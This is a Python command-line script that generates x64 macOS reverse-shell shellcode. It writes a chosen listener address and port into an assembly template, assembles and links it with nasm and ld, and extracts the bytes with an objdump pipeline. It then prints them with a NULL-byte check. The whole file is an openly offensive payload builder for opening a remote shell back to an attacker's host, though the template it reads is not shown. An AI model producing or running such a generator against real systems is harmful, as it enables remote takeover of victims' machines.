#!/usr/bin/python3

import argparse
import sys
import os
import socket

def convert_args(address, port):
	
	address = socket.inet_aton(address).hex()
	le_address = bytearray.fromhex(address)
	le_address.reverse()
	address = ''.join(format(x, '02x') for x in le_address)

	port = str(hex(socket.htons(port)))

	port = port[2:]

	return address, port
	
def set_args(laddress,lport):

	address, port = convert_args(laddress, lport)
	asm = open("macOS_reverse_shell_x64.asm", 'rt')
	data = asm.read()
	data = data.replace('ADDRESS', address)
	data = data.replace('PORT', port)
	asm.close()
	asm = open('reverse-{}.asm'.format(lport), 'wt')
	asm.write(data)
	asm.close()

def gen_shellcode(port):
	stream = os.popen("""objdump -d ./reverse-{}|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|tr -d '\n'|sed 's/^/"/'|sed 's/$/"/g'""".format(port))
	shellcode = stream.read().rstrip()
	shellcode = shellcode.replace("x", "\\x")
	return shellcode

def print_shellcode(shellcode, address, port):
	print("[*] Generating shellcode for x64 macOS reverse shell on {0}:{1}".format(address, port))
	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
	print(shellcode)

def main():

	parser = argparse.ArgumentParser(description='Generate x64 macOS reverse shell shellcode.')
	parser.add_argument('-l', '--lhost', type=str, help='Remote IPv4 address for TCP reverse shell to connect to.')
	parser.add_argument('-p', '--port', type=int, help='Remote port for TCP reverse shell to connect to.')
	
	args = parser.parse_args()
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()

	# Modify the host address and port in tcp_reverse_shell_x86.nasm
	set_args(args.lhost, args.port)

	# Link and assemble code
	os.system('nasm -f macho64 -o macOS_reverse_shell_x64.o reverse-{}.asm'.format(args.port))
	os.system('ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem macOS_reverse_shell_x64.o -o reverse-{}'.format(args.port))
	
	# Dump the shellcode using objdump
	shellcode = gen_shellcode(args.port)

	# Print shellcode
	print_shellcode(shellcode, args.lhost, args.port)

	# Cleanup
	os.system('rm macOS_reverse_shell_x64.o')

if __name__ == "__main__":
	main()
